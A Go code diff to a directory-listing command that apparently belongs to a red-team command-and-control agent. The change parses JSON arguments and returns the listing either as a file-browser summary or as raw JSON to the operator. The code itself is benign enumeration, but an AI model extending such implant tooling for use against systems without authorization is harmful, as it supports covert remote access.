@@ -13,14 +13,18 @@ import (
 
 var mu sync.Mutex
 
+type Arguments struct {
+	Path         string    `json:"path"`
+	FileBrowser         bool    `json:"file_browser"`
+}
+
 func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
-	if len(task.Params) == 0 {
-		task.Params = "."
-	}
+	args := Arguments{}
+	json.Unmarshal([]byte(task.Params), &args)
 	var e structs.DirectoryEntries
-	abspath, _ := filepath.Abs(task.Params)
+	abspath, _ := filepath.Abs(args.Path)
 	dirInfo, err := os.Stat(abspath)
     if err != nil {
 		msg.UserOutput = err.Error()
@@ -71,7 +75,12 @@ func Run(task structs.Task) {
     }
     msg.Completed = true
     msg.FileBrowser = e
-	msg.UserOutput = "Retrieved data for file browser"
+    if args.FileBrowser {
+        msg.UserOutput = "Retrieved data for file browser"
+    } else{
+        temp, _ := json.Marshal(msg.FileBrowser)
+        msg.UserOutput = string(temp)
+    }
 	resp, _ := json.Marshal(msg)
 	mu.Lock()
 	profiles.TaskResponses = append(profiles.TaskResponses, resp)
